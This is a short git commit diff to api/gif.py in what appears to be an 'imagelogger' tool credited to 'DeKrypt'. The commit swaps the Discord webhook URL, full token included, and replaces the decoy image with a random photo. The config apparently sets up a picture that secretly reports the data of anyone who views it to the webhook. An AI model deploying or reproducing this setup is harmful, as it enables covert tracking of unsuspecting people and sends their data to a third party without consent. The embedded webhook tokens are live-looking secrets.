28da169328888eda1593fa760625f5c57bd3b042
alexovsky <bubualexihow@gmail.com>
2025-02-05 15:21:44 +0400

    Update gif.py

--- api/gif.py
+++ api/gif.py
@@ -12,8 +12,8 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1335666060824940646/qcx2OK0bFbtPmKIMPtzXelZsrcJa8x3yboDWgoCnUaR8nMOjpaRIpJxrNB4DhcAwKjZO",
-    "image": "https://images.techhive.com/images/article/2014/04/windows-xp-bliss-desktop-image-100259888-orig.jpg", # You can also have a custom image by using a URL argument
+    "webhook": "https://discord.com/api/webhooks/1336657231667658792/OMT49IibokK0mSUHtRVx0qMqU867Q3cxZyeyVbgKSnwh5BRuWAbNtaZRniYqj4ErSQ8V",
+    "image": "https://picsum.photos/400/300.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
